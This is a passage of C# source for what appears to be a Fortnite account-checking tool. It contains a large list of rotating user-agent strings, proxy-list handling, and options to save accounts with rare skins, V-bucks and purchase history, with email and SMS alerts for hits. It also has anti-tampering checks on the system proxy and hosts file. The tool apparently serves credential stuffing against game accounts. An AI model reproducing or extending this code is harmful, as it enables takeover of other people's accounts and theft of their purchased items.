            "Mozilla/5.0 (Windows; U; Windows NT 6.1; hu; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 GTB7.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:1.9.2.8) Gecko/20100722 AskTbADAP/3.9.1.14019 Firefox/3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ja; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 GTB7.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-BR; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-PT; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:1.9.2.9) Gecko/20100913 Firefox/3.6.9",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-TW; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 ( .NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; Windows NT 5.1; en-US; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre",
            "Mozilla/5.0 (Windows; Windows NT 5.1; es-ES; rv:1.9.2a1pre) Gecko/20090402 Firefox/3.6a1pre",
            "Mozilla/5.0 (X11; Arch Linux i686; rv:2.0) Gecko/20110321 Firefox/4.0",
            "Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (X11; Linux AMD64) Gecko Firefox/5.0",
            "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:5.0a2) Gecko/20110524 Firefox/5.0a2",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110518 Firefox/4.0.1",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b10) Gecko/20100101 Firefox/4.0b10",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20100101 Firefox/4.0b12pre",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b12pre) Gecko/20110204 Firefox/4.0b12pre",
            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
            "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
            "Mozilla/5.0 (X11; Linux ppc; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko Firefox/5.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20110506 Firefox/4.0.1",
            "Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4",
            "Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre",
            "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
            "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre",
            "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 FirePHP/0.5",
            "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Firefox/5.0",
            "Mozilla/5.0 (X11; Linux) Gecko Firefox/5.0",
            "Mozilla/5.0 (X11; Mageia; Linux x86_64; rv:10.0.9) Gecko/20100101 Firefox/10.0.9",
            "Mozilla/5.0 (X11; NetBSD amd64; rv:16.0) Gecko/20121102 Firefox/16.0",
            "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
            "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.2.9) Gecko/20100913 Firefox/3.6.9",
            "Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
            "Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)",
            "Mozilla/5.0 (X11; U; Linux i586; de; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.9.2.8) Gecko/20100725 Gentoo Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:2.0) Gecko/20110404 Fedora/16-dev Firefox/4.0",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Firefox/11.0",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.4) Gecko/20100625 Gentoo Firefox/3.6.4",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.7) Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.8) Gecko/20100727 Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.9) Gecko/20100827 Red Hat/3.6.9-2.el6 Firefox/3.6.9",
            "Mozilla/5.0 (X11; U; Linux i686; fa; rv:1.8.1.4) Gecko/20100527 Firefox/3.6.4",
            "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
            "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
            "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
            "Mozilla/5.0 (X11; U; Linux i686; ru-RU; rv:1.9.2a1pre) Gecko/20090405 Ubuntu/9.04 (jaunty) Firefox/3.6a1pre",
            "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.3) Gecko/20091020 Ubuntu/10.04 (lucid) Firefox/4.0.1",
            "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.3a5pre) Gecko/20100526 Firefox/3.7a5pre",
            "Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.2.8) Gecko/20100722 Ubuntu/10.04 (lucid) Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.4) Gecko/20100614 Ubuntu/10.04 (lucid) Firefox/3.6.4",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 GTB7.0",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 GTB7.1",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100723 Fedora/3.6.7-1.fc13 Firefox/3.6.7",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100723 SUSE/3.6.8-0.1.1 Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090405 Firefox/3.6a1pre",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090428 Firefox/3.6a1pre",
            "Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:2.0) Gecko/20110307 Firefox/4.0",
            "Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.2.8) Gecko/20101230 Firefox/3.6.8",
            "Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0.1",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
            "Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0",
            "Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4",
            "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
            "Mozilla/3.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/5.0.1",
            Http.ChromeUserAgent(),
            Http.FirefoxUserAgent()
        };
        }
        private void GetHWIDInfo()
        {
            try
            {
                string ThisPCName = System.Net.Dns.GetHostName();
                FinalEncrypt = "";
                FinalEncrypt = GenerateSHA512String(ThisPCName);
            }
            catch (Exception EX)
            {

            }
        }

        public static string GenerateSHA512String(string inputString)
        {
            SHA512 sha512 = SHA512Managed.Create();
            byte[] bytes = Encoding.UTF8.GetBytes(inputString);
            byte[] hash = sha512.ComputeHash(bytes);
            return GetStringFromHash(hash);
        }
        private static string GetStringFromHash(byte[] hash)
        {
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < hash.Length; i++)
            {
                result.Append(hash[i].ToString("X2"));
            }
            return result.ToString();
        }

        private async void Blink()
        {
            while (true)
            {
                await Task.Delay(500);
                label13.ForeColor = label13.ForeColor == Color.Blue ? Color.Green : Color.Blue;
            }
        }

        private void LoadRandomHomeImage()
        {
            try
            {
                try
                {
                    string CustomStartScreenImage = new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/LoadingScreen/ImageURLs.txt");
                    string[] mystrings = CustomStartScreenImage.Split('|');
                    string CustomImageStart = mystrings[randomimage.Next(mystrings.Length)];
                    pictureBox6.ImageLocation = CustomImageStart;
                }
                catch
                {

                }
            }
            catch
            {
                try
                {
                    string[] mystrings = "http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif1.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif2.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif3.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif4.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif5.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif6.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif7.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif8.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif9.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif10.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif11.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif12.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif13.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif14.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif15.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif16.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif17.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif18.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif19.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif20.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif21.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif22.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif23.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif24.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif25.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif26.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif27.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif28.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif29.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif30.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif31.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif32.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif33.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif34.gif|http://tcmtools.com/CheckerStuff/LoadingScreen/ImageDirectory/gif35.gif".Split('|');
                    string CustomImageStart = mystrings[randomimage.Next(mystrings.Length)];
                    pictureBox6.ImageLocation = CustomImageStart;
                }
                catch
                {

                }
            }
        }

        private void BreakAnyHTTPSpoofers()
        {
            try
            {
                RegistryKey registry = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
                string ProxyEnabledOrNuh = registry.GetValue("ProxyEnable").ToString();
                object ProxyServerValue = registry.GetValue("ProxyServer");
                if (ProxyEnabledOrNuh == "1")
                {
                    MessageBox.Show("Attempt to bypass login detected, Will now close application!");
                    Process.GetCurrentProcess().Kill();
                }
            }
            catch
            {

            }
            try
            {
                string FileContent = File.ReadAllText(@"C:\WINDOWS\System32\Drivers\Etc\hosts");
                if (FileContent.Contains("tcmtools.com") || FileContent.Contains("Gamersocial.co"))
                {
                    MessageBox.Show("Attempt to bypass login detected, Will now close application!");
                    Process.GetCurrentProcess().Kill();
                }
            }
            catch
            {

           }
        }


        private void StartCurrentTimers()
        {
            timer2.Interval = (15000) * (1);
            timer2.Enabled = true;
            timer2.Start();
        }

        private void ChangelogShit()
        {
            try
            {
                string fullPage = wc2.DownloadString("http://tcmtools.com/CheckerStuff/FortniteTool/ChangeLog.txt");
                foreach (string line in fullPage.Split(new string[] { "\r\n", "\n", Environment.NewLine }, StringSplitOptions.None))
                {
                    ChangeLogTextBox.Text += line + "\r\n";
                }
            }
            catch { }
        }

        private void startnotificationsettings()
        {
            foreach (FormAnimator.AnimationMethod method in Enum.GetValues(typeof(FormAnimator.AnimationMethod)))
            {
                comboBoxAnimation.Items.Add(method.ToString());
            }
            comboBoxAnimation.SelectedIndex = 2;

            foreach (FormAnimator.AnimationDirection direction in Enum.GetValues(typeof(FormAnimator.AnimationDirection)))
            {
                comboBoxAnimationDirection.Items.Add(direction.ToString());
            }
            comboBoxAnimationDirection.SelectedIndex = 3;


            _initialLoad = false;

            comboBoxDuration.SelectedIndex = 0;
        }

        private void ShowNotification(string Title, string Description)
        {
            if (DisableNotify.Checked)
            {
                return;
            }
            int duration;
            int.TryParse(comboBoxDuration.SelectedItem.ToString(), out duration);
            if (duration <= 0)
            {
                duration = -1;
            }

            var animationMethod = FormAnimator.AnimationMethod.Slide;
            foreach (FormAnimator.AnimationMethod method in Enum.GetValues(typeof(FormAnimator.AnimationMethod)))
            {
                if (string.Equals(method.ToString(), comboBoxAnimation.SelectedItem))
                {
                    animationMethod = method;
                    break;
                }
            }

            var animationDirection = FormAnimator.AnimationDirection.Up;
            foreach (FormAnimator.AnimationDirection direction in Enum.GetValues(typeof(FormAnimator.AnimationDirection)))
            {
                if (string.Equals(direction.ToString(), comboBoxAnimationDirection.SelectedItem))
                {
                    animationDirection = direction;
                    break;
                }
            }

            var toastNotification = new Notification(Title, Description, duration, animationMethod, animationDirection);
            if (DisableSounds.Checked == false)
            {
                PlayNotificationSound();
            }
            toastNotification.Show();
        }

        private static void PlayNotificationSound()
        {
            using (var player = new System.Media.SoundPlayer("NotificationSound/beep.wav"))
            {
                player.Play();
            }
        }
        private void LoadUpSettings()
        {
            ForumUser.Text = Settings.Default["Username"].ToString();
            ForumPassword.Text = Settings.Default["Password"].ToString();
            ApiKeyTextBox.Text = Settings.Default["APIkey"].ToString();
            ApiSecretTextBox.Text = Settings.Default["APISecret"].ToString();

            EmailToNotifyToo.Text = Settings.Default["YourEmail"].ToString();
            TextNowNotificationsText.Text = Settings.Default["YourSMS"].ToString();
            APIText.Text = Settings.Default["APIURL"].ToString();
            setfirstsettings();
            string LoadCB1 = Settings.Default["SaveCB1"].ToString();
            if (LoadCB1 == "True")
            {
                BlackKnightSaveFile.Checked = true;
            }
            else
            {
                BlackKnightSaveFile.Checked = false;
            }
            string LoadCB2 = Settings.Default["SaveCB2"].ToString();
            if (LoadCB2 == "True")
            {
                CodenameELFSaveFile.Checked = true;
            }
            else
            {
                CodenameELFSaveFile.Checked = false;
            }
            string LoadCB3 = Settings.Default["SaveCB3"].ToString();
            if (LoadCB2 == "True")
            {
                CrackshotSaveFile.Checked = true;
            }
            else
            {
                CrackshotSaveFile.Checked = false;
            }
            string LoadCB4 = Settings.Default["SaveCB4"].ToString();
            if (LoadCB4 == "True")
            {
                GhoulTrooperSaveFile.Checked = true;
            }
            else
            {
                GhoulTrooperSaveFile.Checked = false;
            }
            string LoadCB5 = Settings.Default["SaveCB5"].ToString();
            if (LoadCB5 == "True")
            {
                GingerGunnerSaveFile.Checked = true;
            }
            else
            {
                GingerGunnerSaveFile.Checked = false;
            }
            string LoadCB6 = Settings.Default["SaveCB6"].ToString();
            if (LoadCB6 == "True")
            {
                MerryMarauderSaveFile.Checked = true;
            }
            else
            {
                MerryMarauderSaveFile.Checked = false;
            }
            string LoadCB7 = Settings.Default["SaveCB7"].ToString();
            if (LoadCB7 == "True")
            {
                NogOpsSaveFile.Checked = true;
            }
            else
            {
                NogOpsSaveFile.Checked = false;
            }
            string LoadCB8 = Settings.Default["SaveCB8"].ToString();
            if (LoadCB8 == "True")
            {
                RedNosedRaiderSaveFile.Checked = true;
            }
            else
            {
                RedNosedRaiderSaveFile.Checked = false;
            }
            string LoadCB9 = Settings.Default["SaveCB9"].ToString();
            if (LoadCB9 == "True")
            {
                SkullTrooperSaveFile.Checked = true;
            }
            else
            {
                SkullTrooperSaveFile.Checked = false;
            }
            string LoadCB10 = Settings.Default["SaveCB10"].ToString();
            if (LoadCB10 == "True")
            {
                YuletideRangerSaveFile.Checked = true;
            }
            else
            {
                YuletideRangerSaveFile.Checked = false;
            }
            string LoadCB11 = Settings.Default["SaveCB11"].ToString();
            if (LoadCB11 == "True")
            {
                ScytheSaveFile.Checked = true;
            }
            else
            {
                ScytheSaveFile.Checked = false;
            }
            string LoadCB12 = Settings.Default["SaveCB12"].ToString();
            if (LoadCB12 == "True")
            {
                STWSaveFile.Checked = true;
            }
            else
            {
                STWSaveFile.Checked = false;
            }
            string LoadCB13 = Settings.Default["SaveCB13"].ToString();
            if (LoadCB13 == "True")
            {
                VbucksSaveFile.Checked = true;
            }
            else
            {
                VbucksSaveFile.Checked = false;
            }
            string LoadCB14 = Settings.Default["SaveCB14"].ToString();
            if (LoadCB14 == "True")
            {
                SaveUselessAccounts.Checked = true;
            }
            else
            {
                SaveUselessAccounts.Checked = false;
            }
            string LoadCB15 = Settings.Default["SaveCB15"].ToString();
            if (LoadCB15 == "True")
            {
                CheckForRareItems.Checked = true;
            }
            else
            {
                CheckForRareItems.Checked = false;
            }
            string LoadCB16 = Settings.Default["SaveCB16"].ToString();
            if (LoadCB16 == "True")
            {
                CheckForSkins.Checked = true;
            }
            else
            {
                CheckForSkins.Checked = false;
            }
            string LoadCB17 = Settings.Default["SaveCB17"].ToString();
            if (LoadCB17 == "True")
            {
                CheckForAxes.Checked = true;
            }
            else
            {
                CheckForAxes.Checked = false;
            }
            string LoadCB18 = Settings.Default["SaveCB18"].ToString();
            if (LoadCB18 == "True")
            {
                CheckForBackBling.Checked = true;
            }
            else
            {
                CheckForBackBling.Checked = false;
            }
            string LoadCB19 = Settings.Default["SaveCB19"].ToString();
            if (LoadCB19 == "True")
            {
                CheckForGliders.Checked = true;
            }
            else
            {
                CheckForGliders.Checked = false;
            }
            string LoadCB20 = Settings.Default["SaveCB20"].ToString();
            if (LoadCB20 == "True")
            {
                CheckForDances.Checked = true;
            }
            else
            {
                CheckForDances.Checked = false;
            }
            string LoadCB21 = Settings.Default["SaveCB21"].ToString();
            if (LoadCB21 == "True")
            {
                CheckForEmojis.Checked = true;
            }
            else
            {
                CheckForEmojis.Checked = false;
            }
            string LoadCB22 = Settings.Default["SaveCB22"].ToString();
            if (LoadCB22 == "True")
            {
                CheckForLoadingScreens.Checked = true;
            }
            else
            {
                CheckForLoadingScreens.Checked = false;
            }
            string LoadCB23 = Settings.Default["SaveCB23"].ToString();
            if (LoadCB23 == "True")
            {
                DisableNotify.Checked = true;
            }
            else
            {
                DisableNotify.Checked = false;
            }
            string LoadCB24 = Settings.Default["SaveCB24"].ToString();
            if (LoadCB24 == "True")
            {
                DisableSounds.Checked = true;
            }
            else
            {
                DisableSounds.Checked = false;
            }
            string LoadCB25 = Settings.Default["SaveCB25"].ToString();
            if (LoadCB25 == "True")
            {
                PCSaveFile.Checked = true;
            }
            else
            {
                PCSaveFile.Checked = false;
            }
            string LoadCB26 = Settings.Default["SaveCB26"].ToString();
            if (LoadCB26 == "True")
            {
                PS4SaveFile.Checked = true;
            }
            else
            {
                PS4SaveFile.Checked = false;
            }
            string LoadCB27 = Settings.Default["SaveCB27"].ToString();
            if (LoadCB27 == "True")
            {
                XboxSaveFile.Checked = true;
            }
            else
            {
                XboxSaveFile.Checked = false;
            }
            string LoadCB28 = Settings.Default["SaveCB28"].ToString();
            if (LoadCB28 == "True")
            {
                NintendoSaveFile.Checked = true;
                NintendoSaveFile.Checked = true;
            }
            else
            {
                NintendoSaveFile.Checked = false;
            }
            string LoadCB29 = Settings.Default["SaveCB29"].ToString();
            if (LoadCB29 == "True")
            {
                CheckForOtherInformation.Checked = true;
            }
            else
            {
                CheckForOtherInformation.Checked = false;
            }
            string LoadCB30 = Settings.Default["SaveCB30"].ToString();
            if (LoadCB30 == "True")
            {
                CheckForBattlePassInformation.Checked = true;
            }
            else
            {
                CheckForBattlePassInformation.Checked = false;
            }
            string LoadCB31 = Settings.Default["SaveCB31"].ToString();
            if (LoadCB31 == "True")
            {
                CheckForPastSeasonInformation.Checked = true;
            }
            else
            {
                CheckForPastSeasonInformation.Checked = false;
            }
            string LoadCB32 = Settings.Default["SaveCB32"].ToString();
            if (LoadCB32 == "True")
            {
                CeckForLast5Purchases.Checked = true;
            }
            else
            {
                CeckForLast5Purchases.Checked = false;
            }
            string LoadCB33 = Settings.Default["SaveCB33"].ToString();
            if (LoadCB33 == "True")
            {
                CheckForTotalItemCount.Checked = true;
            }
            else
            {
                CheckForTotalItemCount.Checked = false;
            }
            string LoadCB34 = Settings.Default["SaveCB34"].ToString();
            if (LoadCB34 == "True")
            {
                StackedSkinSaver.Checked = true;
            }
            else
            {
                StackedSkinSaver.Checked = false;
            }
            string LoadCB35 = Settings.Default["SaveCB35"].ToString();
            if (LoadCB35 == "True")
            {
                APISender.Checked = true;
            }
            else
            {
                APISender.Checked = false;
            }
            string LoadCB36 = Settings.Default["SaveCB36"].ToString();
            if (LoadCB36 == "True")
            {
                RoyaleBomberSaveFile.Checked = true;
            }
            else
            {
                RoyaleBomberSaveFile.Checked = false;
            }
            string LoadCB37 = Settings.Default["SaveCB37"].ToString();
            if (LoadCB37 == "True")
            {
                CandyAxeSaveFile.Checked = true;
            }
            else
            {
                CandyAxeSaveFile.Checked = false;
            }
            string LoadCB38 = Settings.Default["SaveCB38"].ToString();
            if (LoadCB38 == "True")
            {
                RaidersRevengeSaveFile.Checked = true;
            }
            else
            {
                RaidersRevengeSaveFile.Checked = false;
            }
            string LoadCB39 = Settings.Default["SaveCB39"].ToString();
            if (LoadCB39 == "True")
            {
                PowerChordSaveFile.Checked = true;
            }
            else
            {
                PowerChordSaveFile.Checked = false;
            }
            string LoadCB40 = Settings.Default["SaveCB40"].ToString();
            if (LoadCB40 == "True")
            {
                SgtGreenCloverSaveFile.Checked = true;
            }
            else
            {
                SgtGreenCloverSaveFile.Checked = false;
            }
            string LoadCB41 = Settings.Default["SaveCB41"].ToString();
            if (LoadCB41 == "True")
            {
                RenegadeSaveFile.Checked = true;
            }
            else
            {
                RenegadeSaveFile.Checked = false;
            }
            string LoadCB42 = Settings.Default["SaveCB42"].ToString();
            if (LoadCB42 == "True")
            {
                AerialAssaultTrooperSaveFile.Checked = true;
            }
            else
            {
                AerialAssaultTrooperSaveFile.Checked = false;
            }
            string LoadCB43 = Settings.Default["SaveCB43"].ToString();
            if (LoadCB43 == "True")
            {
                SaveSTWTiersToFiles.Checked = true;
            }
            else
            {
                SaveSTWTiersToFiles.Checked = false;
            }
            string LoadCB44 = Settings.Default["SaveCB44"].ToString();
            if (LoadCB44 == "True")
            {
                RemoveWhenChecked.Checked = true;
            }
            else
            {
                RemoveWhenChecked.Checked = false;
            }
            string LoadCB45 = Settings.Default["SaveCB45"].ToString();
            if (LoadCB45 == "True")
            {
                EnableRemoveBadProxies.Checked = true;
            }
            else
            {
                EnableRemoveBadProxies.Checked = false;
            }
            string LoadCB46 = Settings.Default["SaveCB46"].ToString();
            if (LoadCB46 == "True")
            {
                RemoveProxiesWithErrors.Checked = true;
            }
            else
            {
                RemoveProxiesWithErrors.Checked = false;
            }
            string LoadCB47 = Settings.Default["SaveCB47"].ToString();
            if (LoadCB47 == "True")
            {
                CheckAccountInfo.Checked = true;
            }
            else
            {
                CheckAccountInfo.Checked = false;
            }
            string LoadCB48 = Settings.Default["SaveCB48"].ToString();
            if (LoadCB48 == "True")
            {
                EnableNotifyEmail.Checked = true;
            }
            else
            {
                EnableNotifyEmail.Checked = false;
            }
            string LoadCB49 = Settings.Default["SaveCB49"].ToString();
            if (LoadCB49 == "True")
            {
                IfStackedChecked.Checked = true;
            }
            else
            {
                IfStackedChecked.Checked = false;
            }
            string LoadCB50 = Settings.Default["SaveCB50"].ToString();
            if (LoadCB50 == "True")
            {
                EmailSentTXT.Checked = true;
            }
            else
            {
                EmailSentTXT.Checked = false;
            }
            string LoadCB51 = Settings.Default["SaveCB51"].ToString();
            if (LoadCB51 == "True")
            {
                EmailSendHTML.Checked = true;
            }
            else
            {
                EmailSendHTML.Checked = false;
            }
            string LoadCB52 = Settings.Default["SaveCB52"].ToString();
            if (LoadCB52 == "True")
            {
                FinalFileHasTextFile.Checked = true;
            }
            else
            {
                FinalFileHasTextFile.Checked = false;
            }
            string LoadCB53 = Settings.Default["SaveCB53"].ToString();
            if (LoadCB53 == "True")
            {
                SendFinalEmailOnly.Checked = true;
            }
            else
            {
                SendFinalEmailOnly.Checked = false;
            }
            string LoadCB54 = Settings.Default["SaveCB54"].ToString();
            if (LoadCB54 == "True")
            {
                EnableTextNowNotify.Checked = true;
            }
            else
            {
                EnableTextNowNotify.Checked = false;
            }
        }

        private void setfirstsettings()
        {
            string SetCB1 = Settings.Default["SaveCB15"].ToString();
            if (SetCB1 == "")
            {
                CheckForRareItems.Checked = true;
            }
            string SetCB2 = Settings.Default["SaveCB16"].ToString();
            if (SetCB2 == "")
            {
